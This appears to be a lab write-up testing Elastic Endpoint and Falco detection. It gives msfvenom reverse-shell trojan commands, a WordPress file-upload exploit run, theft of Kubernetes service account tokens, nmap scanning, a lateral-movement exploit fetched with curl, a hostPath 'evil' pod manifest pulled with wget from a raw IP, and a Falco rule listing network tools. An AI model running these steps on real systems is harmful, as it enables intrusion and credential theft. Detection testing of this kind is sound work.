This section shows the command executed for the use cases that appeared in the slides in order to replay them easier. 

# Elastic Endpoint Security tests

## Generating a basic trojan with metasploilt

Attacker side

```bash
nc -lnvp 9001
```

Generation of the payload

```bash
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=ip LPORT=9001 -f elf -o /home/user/trojan
```
where ``ip`` is the ip of the host where the attacker is listening. 


## Generating a shikata-ga-nai encoded trojan with Metaspoilt

Attacker side

```bash
nc -lnvp 9001
```

Generation of the payload

```bash
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=ip LPORT=9001 -b "\x00" -f elf -o /home/user/trojan
```
where ``ip`` is the ip of the host where the attacker is listening. 

# Falco tests

## Realistic scenario of an infiltration inside a Kubernetes Cluster

The tests realised for testing Falco agent follow themeselves and simulate a realistic attack into a Kubernetes Cluster, from the intrusion, persistence, discovery and privilege escalation. Each test can be mapped to one of the element of the Microsoft Threat Matrix in a Kubernetes environement. [K8S threat matrix](https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/). 

## Use case 1 : exploiting vulnerable wordpress File Upload Plugin to upload a reverse shell

```bash
borie@pgp-branche:~$ pip install urlparse2 
borie@pgp-branche:~$ pip install requests
borie@pgp-branche:~/exploit$ python exploit.py http://142.93.65.231/2021/09/13/hack-me-if-you-can/ / 
[+] admin-ajax.php: http://142.93.65.231//wp-admin/admin-ajax.php
[+] admin-ajax.php should be fine, keep testing
[+] Plugin url: http://142.93.65.231/2021/09/13/hack-me-if-you-can/
[+] Using payload: ../plugins/wp-file-upload/lib/RcE-for-Th3-WiN.txt
[+] Retrived nonce parameter: 3b875bc68c
[+] Retrived params_index parameter: rmFyb4RaMMeWm1WF
[+] Retrived session_token parameter: 4091528856140e0f4c3da71.68593495
[+] Stage 1 success
[+] Stage 2 work fine
[+] Stage 3 work prefectly :)
[+] We should have our webshell, gonna check it!
www-data

$ whoami
www-data
```
Now you have a **reverse shell** on a Pod running the wordpress app in the container. 

You can check Falco logs to verify detection directly from Kubernetes or from your Kibana Dashboard if you exported Falco logs to Elasticsearch.

First check on which node wordpress pod is running since Falco pod is deployed as a `DaemonSet` and one Falco pod is running on each pod. You have to check Falco logs of the right Falco pod. 

```bash
root@elastic:~# kubectl get pods -n red-ns -o wide
NAME                         READY   STATUS    RESTARTS   AGE   IP           NODE                  NOMINATED NODE   READINESS GATES
mysql-c65957f85-nst95        1/1     Running   0          24h   10.42.1.29   cluster-02-worker01   <none>           <none>
wordpress-66cd544579-cv29k   2/2     Running   0          24h   10.42.1.30   cluster-02-worker01   <none>           <none>
```
```bash
root@elastic:~# kubectl get pods -n falco -o wide
NAME          READY   STATUS    RESTARTS   AGE   IP           NODE                  NOMINATED NODE   READINESS GATES
falco-58v4g   1/1     Running   1          19d   10.42.1.19   cluster-02-worker01   <none>           <none>
falco-l57l4   1/1     Running   0          19d   10.42.2.7    cluster-02-worker02   <none>           <none>
```

```bash
root@elastic:~# kubectl -n falco logs falco-58v4g
{"output":"17:47:41.952885889: Debug Shell spawned by untrusted binary (user=www-data user_loginuid=-1 shell=sh parent=apache2 cmdline=sh -c /usr/sbin/sendmail -t -i pcmdline=apache2 -DFOREGROUND gparent=apache2 ggparent=<NA> aname[4]=<NA> aname[5]=<NA> aname[6]=<NA> aname[7]=<NA> container_id=854d2f6f3c68 image=paulborielabs/wordpress) k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68","priority":"Debug","rule":"Run shell untrusted","time":"2021-09-13T17:47:41.952885889Z", "output_fields": {"container.id":"854d2f6f3c68","container.image.repository":"paulborielabs/wordpress","evt.time":1631555261952885889,"k8s.ns.name":"red-ns","k8s.pod.name":"wordpress-66cd544579-cv29k","proc.aname[2]":"apache2","proc.aname[3]":null,"proc.aname[4]":null,"proc.aname[5]":null,"proc.aname[6]":null,"proc.aname[7]":null,"proc.cmdline":"sh -c /usr/sbin/sendmail -t -i","proc.name":"sh","proc.pcmdline":"apache2 -DFOREGROUND","proc.pname":"apache2","user.loginuid":-1,"user.name":"www-data"}}
```

## Use case 2 : access container service account 

I cheated a little bit here, the user I have when using the reverse shell is `www-data` but for the next step we need to be root inside the container. I tried run the wordpress image as root but `apache` has prevention mechanism that disallow us to run their image as root. To mimick root user is just `exec` into the container with `kubectl` utility for the next tests.  

```bash
root@elastic:~# kubectl get pods -n red-ns
NAME                         READY   STATUS    RESTARTS   AGE
mysql-c65957f85-nst95        1/1     Running   0          24h
wordpress-66cd544579-cv29k   2/2     Running   0          24h

root@elastic:~# kubectl -n red-ns exec -it wordpress-66cd544579-cv29k -- bash
Defaulted container "wordpress" out of: wordpress, wp-cli
root@wordpress-66cd544579-cv29k:/var/www/html# cat /var/run/secrets/kubernetes.io/serviceaccount/token  
eyJhbGciOiJSUzI1NiIsImtpZCI6IlNuWHRyQlNnbXEzeVVza2hPcHY1WUhLZG1zVWRDN2dYeW5sX2U0QUtRS2sifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJyZWQtbnMiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGVmYXVsdC10b2tlbi01NWdqcSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQudWlkIjoiNzZjMmQ4ZDItMmI2Ni00MTkyLWIzN2UtZTA2ZjZiNmEzOTAwIiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OnJlZC1uczpkZWZhdWx0In0.rpxYECc2zdJgUu_fGZIvEJi9n3Eh5MUg9qlyRk7qNxoTHlciaoVb1sDO1Zs460j5lqhWft_SPlsYZ8DAPSB1BeYSCgwLuMzfg4pkhK86brgQ6i3hlyYm5Lc6o17uaFvMq5IY40Y0wB68okYu2wp6SDQn5wKhkXbZ7s8DnJmRdVSnXIGqM0cshsPvsqONlOHxbNkgyWxSNxr9JPmbnj4xQ6UAD7USeqpgQVt6bju8PchntmwQoUys_9Bu_CI2bIfOcfBGU
```
Not detected by falco

## Use case 3 : install external tools from container

```bash
root@wordpress-66cd544579-cv29k:/var/www/html# apt update
Get:1 http://deb.debian.org/debian buster InRelease [122 kB]
Get:2 http://deb.debian.org/debian buster-updates InRelease [51.9 kB]  
Get:3 http://security.debian.org/debian-security buster/updates InRelease [65.4 kB]
Get:4 http://deb.debian.org/debian buster/main amd64 Packages [7907 kB]
Get:5 http://deb.debian.org/debian buster-updates/main amd64 Packages [15.2 kB]
Get:6 http://security.debian.org/debian-security buster/updates/main amd64 Packages [303 kB]
Fetched 8465 kB in 2s (3865 kB/s)                         
Reading package lists... Done
Building dependency tree       
Reading state information... Done
6 packages can be upgraded. Run 'apt list --upgradable' to see them.
root@wordpress-66cd544579-cv29k:/var/www/html# apt install wget
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following additional packages will be installed:
  libpcre2-8-0
The following NEW packages will be installed:
  libpcre2-8-0 wget
0 upgraded, 2 newly installed, 0 to remove and 6 not upgraded.
Need to get 1115 kB of archives.
After this operation, 3925 kB of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 http://deb.debian.org/debian buster/main amd64 libpcre2-8-0 amd64 10.32-5 [213 kB]
Get:2 http://deb.debian.org/debian buster/main amd64 wget amd64 1.20.1-1.1 [902 kB]
Fetched 1115 kB in 0s (33.2 MB/s)
debconf: delaying package configuration, since apt-utils is not installed
Selecting previously unselected package libpcre2-8-0:amd64.
(Reading database ... 15409 files and directories currently installed.)
Preparing to unpack .../libpcre2-8-0_10.32-5_amd64.deb ...
Unpacking libpcre2-8-0:amd64 (10.32-5) ...
Selecting previously unselected package wget.
Preparing to unpack .../wget_1.20.1-1.1_amd64.deb ...
Unpacking wget (1.20.1-1.1) ...
Setting up libpcre2-8-0:amd64 (10.32-5) ...
Setting up wget (1.20.1-1.1) ...
Processing triggers for libc-bin (2.28-10) ...
```

```bash
{"output":"18:18:23.256697539: Error Package management process launched in container (user=root user_loginuid=-1 command=apt install wget container_id=854d2f6f3c68 container_name=k8s_wordpress_wordpress-66cd544579-cv29k_red-ns_84a78bd4-d090-4e67-b011-8a77e478eb75_0 image=paulborielabs/wordpress:gare) k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68","priority":"Error","rule":"Launch Package Management Process in Container","time":"2021-09-14T18:18:23.256697539Z", "output_fields": {"container.id":"854d2f6f3c68","container.image.repository":"paulborielabs/wordpress","container.image.tag":"gare","container.name":"k8s_wordpress_wordpress-66cd544579-cv29k_red-ns_84a78bd4-d090-4e67-b011-8a77e478eb75_0","evt.time":1631643503256697539,"k8s.ns.name":"red-ns","k8s.pod.name":"wordpress-66cd544579-cv29k","proc.cmdline":"apt install wget","user.loginuid":-1,"user.name":"root"}}
```

## Use case 4 : access the k8s apiserver

1 - Download `kubectl` from the pod to query apiserver easier without `curl`. Kubectl will automatically query the apiserver with the container sercice account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`. 

```bash
root@wordpress-66cd544579-cv29k:~# curl -LO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 44.7M  100 44.7M    0     0   107M      0 --:--:-- --:--:-- --:--:--  107M
```

```bash
{"output":"18:24:15.818010170: Error File below / or /root opened for writing (user=root user_loginuid=-1 command=curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.22.1/bin/linux/amd64/kubectl parent=bash file=/root/kubectl program=curl container_id=854d2f6f3c68 image=paulborielabs/wordpress) k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68","priority":"Error","rule":"Write below root","time":"2021-09-14T18:24:15.818010170Z", "output_fields": {"container.id":"854d2f6f3c68","container.image.repository":"paulborielabs/wordpress","evt.time":1631643855818010170,"fd.name":"/root/kubectl","k8s.ns.name":"red-ns","k8s.pod.name":"wordpress-66cd544579-cv29k","proc.cmdline":"curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.22.1/bin/linux/amd64/kubectl","proc.name":"curl","proc.pname":"bash","user.loginuid":-1,"user.name":"root"}}
```
2 - query apiserver with `kubectl`

```bash
root@wordpress-66cd544579-cv29k:~# chmod +x kubectl 
root@wordpress-66cd544579-cv29k:~# ./kubectl auth can-i --list
Resources                                       Non-Resource URLs   Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []               [create]
                                                [/api/*]            []               [get]
                                                [/api]              []               [get]
                                                [/apis/*]           []               [get]
                                                [/apis]             []               [get]
                                                [/healthz]          []               [get]
                                                [/healthz]          []               [get]
                                                [/livez]            []               [get]
                                                [/livez]            []               [get]
                                                [/openapi/*]        []               [get]
                                                [/openapi]          []               [get]
                                                [/readyz]           []               [get]
                                                [/readyz]           []               [get]
                                                [/version/]         []               [get]
                                                [/version/]         []               [get]
                                                [/version]          []               [get]
                                                [/version]          []               [get]

```
```bash
{"output":"18:26:58.470432404: Warning Docker or kubernetes client executed in container (user=root user_loginuid=-1 k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 parent=bash cmdline=kubectl auth can-i --list image=paulborielabs/wordpress:gare) k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68","priority":"Warning","rule":"The docker client is executed in a container","time":"2021-09-14T18:26:58.470432404Z", "output_fields": {"container.id":"854d2f6f3c68","container.image.repository":"paulborielabs/wordpress","container.image.tag":"gare","evt.time":1631644018470432404,"k8s.ns.name":"red-ns","k8s.pod.name":"wordpress-66cd544579-cv29k","proc.cmdline":"kubectl auth can-i --list","proc.pname":"bash","user.loginuid":-1,"user.name":"root"}}

{"output":"18:26:58.519513058: Notice Unexpected connection to K8s API Server from container (command=kubectl auth can-i --list k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 image=paulborielabs/wordpress:gare connection=10.42.1.30:42244->10.43.0.1:443) k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68","priority":"Notice","rule":"Contact K8S API Server From Container","time":"2021-09-14T18:26:58.519513058Z", "output_fields": {"container.id":"854d2f6f3c68","container.image.repository":"paulborielabs/wordpress","container.image.tag":"gare","evt.time":1631644018519513058,"fd.name":"10.42.1.30:42244->10.43.0.1:443","k8s.ns.name":"red-ns","k8s.pod.name":"wordpress-66cd544579-cv29k","proc.cmdline":"kubectl auth can-i --list"}}
```

## Use case 5 : Network mapping

1 - install nmap from container

```bash
root@wordpress-66cd544579-cv29k:~# apt install nmap
```

2 - scan the network with default pod CIDR range (10.42.0.0/16 in most k8s distrib) or default service CIDR range (10.43.0.0/16 in most k8s distrib). In the example below we only scan the pods on node 1 (10.42.**1**.0/24) and port 80 to have quicker results, a full kubernetes network nmap scan can take a lot of times.  

```bash
root@wordpress-66cd544579-cv29k:~# nmap 10.42.1.34/24 -p 80 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-09-15 11:46 UTC
Nmap scan report for 10-42-1-17.metrics-server.kube-system.svc.cluster.local (10.42.1.17)
Host is up (0.000053s latency).

PORT   STATE  SERVICE
80/tcp closed http

Nmap scan report for 10-42-1-19.falco.falco.svc.cluster.local (10.42.1.19)
Host is up (0.000030s latency).

PORT   STATE  SERVICE
80/tcp closed http


Nmap scan report for 10-42-1-24.default-http-backend.ingress-nginx.svc.cluster.local (10.42.1.24)
Host is up (0.0024s latency).

PORT   STATE  SERVICE
80/tcp closed http

Nmap scan report for 10-42-1-25.kube-dns.kube-system.svc.cluster.local (10.42.1.25)
Host is up (0.00011s latency).

PORT   STATE  SERVICE
80/tcp closed http

Nmap scan report for 10-42-1-29.mysql.red-ns.svc.cluster.local (10.42.1.29)
Host is up (0.000029s latency).

PORT   STATE  SERVICE
80/tcp closed http

Nmap scan report for 10-42-1-33.mysql.dev.svc.cluster.local (10.42.1.33)
Host is up (0.000036s latency).

PORT   STATE  SERVICE
80/tcp closed http

Nmap scan report for 10-42-1-34.wordpress.dev.svc.cluster.local (10.42.1.34)
Host is up (0.000055s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for wordpress-66cd544579-cv29k (10.42.1.30)
Host is up (0.000065s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 256 IP addresses (14 hosts up) scanned in 5.34 seconds
```

```bash
{"output":"19:43:58.972126696: Notice Network tool launched in container (user=root user_loginuid=-1 command=nmap -p 80 10.42.2.0/24 parent_process=bash container_id=854d2f6f3c68 container_name=k8s_wordpress_wordpress-66cd544579-cv29k_red-ns_84a78bd4-d090-4e67-b011-8a77e478eb75_0 image=paulborielabs/wordpress:gare) k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68","priority":"Notice","rule":"Launch Suspicious Network Tool in Container","time":"2021-09-14T19:43:58.972126696Z", "output_fields": {"container.id":"854d2f6f3c68","container.image.repository":"paulborielabs/wordpress","container.image.tag":"gare","container.name":"k8s_wordpress_wordpress-66cd544579-cv29k_red-ns_84a78bd4-d090-4e67-b011-8a77e478eb75_0","evt.time":1631648638972126696,"k8s.ns.name":"red-ns","k8s.pod.name":"wordpress-66cd544579-cv29k","proc.cmdline":"nmap -p 80 10.42.2.0/24","proc.pname":"bash","user.loginuid":-1,"user.name":"root"}}

{"output":"18:34:17.563951919: Notice Packet socket was created in a container (user=root user_loginuid=-1 command=nmap 10.42.1.0/24 -p 80 socket_info=domain=17(AF_PACKET) type=3 proto=768  container_id=854d2f6f3c68 container_name=k8s_wordpress_wordpress-66cd544579-cv29k_red-ns_84a78bd4-d090-4e67-b011-8a77e478eb75_0 image=paulborielabs/wordpress:gare) k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68 k8s.ns=red-ns k8s.pod=wordpress-66cd544579-cv29k container=854d2f6f3c68","priority":"Notice","rule":"Packet socket created in container","time":"2021-09-14T18:34:17.563951919Z", "output_fields": {"container.id":"854d2f6f3c68","container.image.repository":"paulborielabs/wordpress","container.image.tag":"gare","container.name":"k8s_wordpress_wordpress-66cd544579-cv29k_red-ns_84a78bd4-d090-4e67-b011-8a77e478eb75_0","evt.args":"domain=17(AF_PACKET) type=3 proto=768 ","evt.time":1631644457563951919,"k8s.ns.name":"red-ns","k8s.pod.name":"wordpress-66cd544579-cv29k","proc.cmdline":"nmap 10.42.1.0/24 -p 80","user.loginuid":-1,"user.name":"root"}}
```
Here we notice this line `Nmap scan report for 10-42-1-34.wordpress.dev.svc.cluster.local (10.42.1.34)`
Let's curl it to have more information. 

```bash
root@wordpress-66cd544579-cv29k:~# curl 10.42.1.34:80
<!doctype html>
<html lang="en-US" >
<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<title>Damn Vulnerable WordPress &#8211; Just another WordPress site</title>

<meta name='robots' content='max-image-preview:large' />

<!-- Social Warfare v3.5.2 https://warfareplugins.com --><style>@font-face {font-family: "sw-icon-font";src:url("http://http//:30050/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.eot?ver=3.5.2");src:url("http://http//:30050/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.eot?ver=3.5.2#iefix") format("embedded-opentype"),url("http://http//:30050/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.woff?ver=3.5.2") format("woff"),
	url("http://http//:30050/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.ttf?ver=3.5.2") format("truetype"),url("http://http//:30050/wp-content/plugins/social-warfare/assets/fonts/sw-icon-font.svg?ver=3.5.2#1445203416") format("svg");font-weight: normal;font-style: normal;}</style>
<!-- Social Warfare v3.5.2 https://warfareplugins.com -->
```
The `curl` request is **not detected** by falco indeed Falco only detects network mapping with the processus name (nmap). So an attacker can run it's own Network Mapping Script it won't be detected.  

```yaml
- rule: Launch Suspicious Network Tool in Container
  desc: Detect network tools launched inside container
  condition: >
    spawned_process and container and network_tool_procs and not user_known_network_tool_activities
  output: >
    Network tool launched in container (user=%user.name user_loginuid=%user.loginuid command=%proc.cmdline parent_process=%proc.pname
    container_id=%container.id container_name=%container.name image=%container.image.repository:%container.image.tag)
  priority: NOTICE
  tags: [network, process, mitre_discovery, mitre_exfiltration]

  - list: network_tool_binaries
  items: [nc, ncat, nmap, dig, tcpdump, tshark, ngrep, telnet, mitmproxy, socat, zmap]

- macro: network_tool_procs
  condition: (proc.name in (network_tool_binaries))
```


By opening the html into a browser, we notice that it is the same vulnerable wordpress application but in another namespace: `dev`, we can still use the exploit to get a reverse shell on the pod running the vuln wordpress app and check its privileges, maybe it has higher privileges than previous service account retrieved in `red-ns` namespace.

By default **all pods can communicate with all pods** even if they are in different namespaces, so we can query all the pods we found with the previous `nmap`. So when a pod is compromised in the cluster it can be dangerous because sometimes you exposed some private service just internaly like a Dashboard and it can be easily requested from the compromised pod leaking some important informations. 
That's why we need to monitor k8s virtual network with: [Network policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/). 

***If you want to control traffic flow at the IP address or port level (OSI layer 3 or 4), then you might consider using Kubernetes NetworkPolicies for particular applications in your cluster. NetworkPolicies are an application-centric construct which allow you to specify how a pod is allowed to communicate with various network "entities" (we use the word "entity" here to avoid overloading the more common terms such as "endpoints" and "services", which have specific Kubernetes connotations) over the network.***


## Use case 6 : Lateral movement

The wordpress app in the `dev` namespace is also vulnerable. So we can get a reverse shell on it from the already compromised pod. 

```bash
root@wordpress-66cd544579-cv29k:~# curl https://raw.githubusercontent.com/beerpwn/CVE/master/WP-File-Upload_disclosure_report/CVE-2020-10564_exploit.py > exploit.py
root@wordpress-66cd544579-cv29k:~# apt install python
root@wordpress-66cd544579-cv29k:~# apt install python-pip
root@wordpress-66cd544579-cv29k:~# pip install urlparse2
root@wordpress-66cd544579-cv29k:~# pip install requests
root@wordpress-66cd544579-cv29k:~# python exploit.py http://10.42.1.34/2021/09/13/hack-me-if-you-can/ / 
```
Now we have a reverse shell on the pod in the dev namespace, let's chech our permission : 

```bash
root@wordpress-9bb79bb48-fw68x:~# curl -LO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl
root@wordpress-9bb79bb48-fw68x:~# chmod +x kubectl
root@wordpress-9bb79bb48-fw68x:~# ls
kubectl
root@wordpress-9bb79bb48-fw68x:~# ./kubectl auth can-i --list
Resources                                                      Non-Resource URLs   Resource Names   Verbs
tokenreviews.authentication.k8s.io                             []                  []               [create]
selfsubjectaccessreviews.authorization.k8s.io                  []                  []               [create]
selfsubjectrulesreviews.authorization.k8s.io                   []                  []               [create]
subjectaccessreviews.authorization.k8s.io                      []                  []               [create]
configmaps                                                     []                  []               [get list watch]
endpoints                                                      []                  []               [get list watch]
limitranges                                                    []                  []               [get list watch]
namespaces                                                     []                  []               [get list watch]
nodes                                                          []                  []               [get list watch]
persistentvolumeclaims                                         []                  []               [get list watch]
persistentvolumes                                              []                  []               [get list watch]
pods                                                           []                  []               [get list watch]
replicationcontrollers                                         []                  []               [get list watch]
resourcequotas                                                 []                  []               [get list watch]
secrets                                                        []                  []               [get list watch]
services                                                       []                  []               [get list watch]
                                                               [/api/*]            []               [get]
                                                               [/api]              []               [get]
                                                               [/apis/*]           []               [
```
We can now list secrets from this pod with its Service Account

## Use case 7 : List kubernetes secrets

```bash
root@wordpress-9bb79bb48-fw68x:~# ./kubectl get secrets
NAME                    TYPE                                  DATA   AGE
default-token-xqql4     kubernetes.io/service-account-token   3      6h38m
devops-token-j8pgs      kubernetes.io/service-account-token   3      10s
wordpress-token-qsfzh   kubernetes.io/service-account-token   3      6h38m
```

Detected:

```bash
{"output":"18:09:11.425872482: Notice Unexpected connection to K8s API Server from container (command=kubectl get secrets k8s.ns=dev k8s.pod=wordpress-9bb79bb48-fw68x container=6721dba88c18 image=paulborielabs/wordpress:gare connection=10.42.1.34:53970->10.43.0.1:443) k8s.ns=dev k8s.pod=wordpress-9bb79bb48-fw68x container=6721dba88c18 k8s.ns=dev k8s.pod=wordpress-9bb79bb48-fw68x container=6721dba88c18","priority":"Notice","rule":"Contact K8S API Server From Container","time":"2021-09-15T18:09:11.425872482Z", "output_fields": {"container.id":"6721dba88c18","container.image.repository":"paulborielabs/wordpress","container.image.tag":"gare","evt.time":1631729351425872482,"fd.name":"10.42.1.34:53970->10.43.0.1:443","k8s.ns.name":"dev","k8s.pod.name":"wordpress-9bb79bb48-fw68x","proc.cmdline":"kubectl get secrets"}}
```

The Devops Service account seems interesting  let's check it's privileges :

```bash
root@wordpress-9bb79bb48-fw68x:~# ./kubectl describe secret devops-token-j8pgs
Name:         devops-token-j8pgs
Namespace:    dev
Labels:       <none>
Annotations:  kubernetes.io/service-account.name: devops
              kubernetes.io/service-account.uid: 9325d2ec-c2af-4d15-8736-b5a431eed4b9

Type:  kubernetes.io/service-account-token

Data
====
ca.crt:     1017 bytes
namespace:  3 bytes
token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IlNuWHRyQlNnbXEzeVVza2hPcHY1WUhLZG1zVWRDN2dYeW5sX2U0QUtRS2sifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXYiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGV2b3BzLXRva2VuLWo4cGdzIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImRldm9wcyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjkzMjVkMmVjLWMyYWYtNGQxNS04NzM2LWI1YTQzMWVlZDRiOSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZXY6ZGV2b3BzIn0.nmV-HExVqXl8sXJKPelItpQSApiBgw4WhC8KO2cDdzbi3I9z4357BZ4uLPa5j9YdFb79Tvp8lohU0LIOBFuFRCpe88jlbt3KVNr9VnEG4XGhTWRr1PjZijDckAcaA1vYhKTSeLMttUjjoyStmqfvcENWeFL43CPSXoXHWd8AbLfZPm-kljo3xBDnCAbrcYdADaVB8nQfjsVzQTQiQ3UG5kujCsUD-1ZkrzN4jQ7TmNlXwd0MuQAtmHosYNZi4vQ8rAa9h-nXyOKo_MJdGV7Mskas-bUnC1Kb_tHaznreA809KI6JFy-Y9YaqaZPGqANhrLyfhATzIjgFB0bXLKDxVw

root@wordpress-9bb79bb48-fw68x:~# echo eyJhbGciOiJSUzI1NiIsImtpZCI6IlNuWHRyQlNnbXEzeVVza2hPcHY1WUhLZG1zVWRDN2dYeW5sX2U0QUtRS2sifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXYiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlY3JldC5uYW1lIjoiZGV2b3BzLXRva2VuLWo4cGdzIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImRldm9wcyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjkzMjVkMmVjLWMyYWYtNGQxNS04NzM2LWI1YTQzMWVlZDRiOSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZXY6ZGV2b3BzIn0.nmV-HExVqXl8sXJKPelItpQSApiBgw4WhC8KO2cDdzbi3I9z4357BZ4uLPa5j9YdFb79Tvp8lohU0LIOBFuFRCpe88jlbt3KVNr9VnEG4XGhTWRr1PjZijDckAcaA1vYhKTSeLMttUjjoyStmqfvcENWeFL43CPSXoXHWd8AbLfZPm-kljo3xBDnCAbrcYdADaVB8nQfjsVzQTQiQ3UG5kujCsUD-1ZkrzN4jQ7TmNlXwd0MuQAtmHosYNZi4vQ8rAa9h-nXyOKo_MJdGV7Mskas-bUnC1Kb_tHaznreA809KI6JFy-Y9YaqaZPGqANhrLyfhATzIjgFB0bXLKDxVw > devops-token

root@wordpress-9bb79bb48-fw68x:~# ./kubectl --token=$(cat devops-token) auth can-i create pods
yes

root@wordpress-9bb79bb48-fw68x:~# ./kubectl --token=$(cat devops-token) auth can-i create pods/exec
yes

```
I can create pods and exec into them with this Service Account token


## Use case 8 : malicious pod creation that mount root path of the host : read / write

```yaml
kind: Pod
metadata: 
  name: alpine
  namespace: dev
spec: 
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 300000000"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true 
```
```bash
root@wordpress-9bb79bb48-fw68x:~# wget 45.55.34.24:8000/evil.yaml
root@wordpress-9bb79bb48-fw68x:~# ./kubectl --token=$(cat devops-token) apply -f evil.yaml 
pod/alpine created
```

Detected 

```bash

{"output":"18:40:54.962885049: Warning Mount was executed inside a privileged container (user=root user_loginuid=-1 command=mount -t tmpfs tmpfs /var/lib/kubelet/pods/04c59dfa-b08c-450d-81bb-48205b92cbc5/volumes/kubernetes.io~secret/default-token-xqql4 k8s.ns=<NA> k8s.pod=<NA> container=849305f2c3de image=rancher/hyperkube:v1.18.20-rancher1) k8s.ns=<NA> k8s.pod=<NA> container=849305f2c3de k8s.ns=<NA> k8s.pod=<NA> container=849305f2c3de","priority":"Warning","rule":"Mount Launched in Privileged Container","time":"2021-09-15T18:40:54.962885049Z", "output_fields": {"container.id":"849305f2c3de","container.image.repository":"rancher/hyperkube","container.image.tag":"v1.18.20-rancher1","evt.time":1631731254962885049,"k8s.ns.name":null,"k8s.pod.name":null,"proc.cmdline":"mount -t tmpfs tmpfs /var/lib/kubelet/pods/04c59dfa-b08c-450d-81bb-48205b92cbc5/volumes/kubernetes.io~secret/default-token-xqql4","user.loginuid":-1,"user.name":"root"}}

